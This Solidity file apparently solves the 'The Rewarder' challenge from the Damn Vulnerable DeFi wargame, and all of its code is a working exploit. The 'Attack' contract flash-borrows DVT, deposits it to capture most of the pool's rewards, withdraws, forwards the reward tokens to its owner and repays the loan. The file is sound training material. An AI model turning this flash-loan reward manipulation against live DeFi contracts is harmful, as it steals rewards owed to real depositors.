// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract Attack {
    FlashLoanerPool private liquidityTokenPool;
    DamnValuableToken private liquidityToken;
    TheRewarderPool private rewarderPool;
    RewardToken private rewardToken;
    address private owner;

    constructor(address _liquidityTokenPool, address _rewarderPool) {
        liquidityTokenPool = FlashLoanerPool(_liquidityTokenPool);
        liquidityToken = liquidityTokenPool.liquidityToken();
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewardToken = rewarderPool.rewardToken();

        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not the owner");
        _;
    }

    function attack(uint256 amount) external onlyOwner {
        // approve the liquidity pool token to spend DVT
        liquidityToken.approve(address(liquidityTokenPool), amount);

        // initiate the flashloan.
        liquidityTokenPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(liquidityTokenPool), "not the liquidity token pool.");

        // approve the rewarder pool to spend DVT tokens.
        liquidityToken.approve(address(rewarderPool), amount);

        // deposit DVT in the rewarder pool to get more shares of the rewards.
        rewarderPool.deposit(amount);

        // withdraw DVT from the reward pool to payback the flashloan.
        rewarderPool.withdraw(amount);

        // transfer the reward token to the attacker address.
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));

        // payback the flashloan.
        liquidityToken.transfer(address(liquidityTokenPool), amount);
    }
}
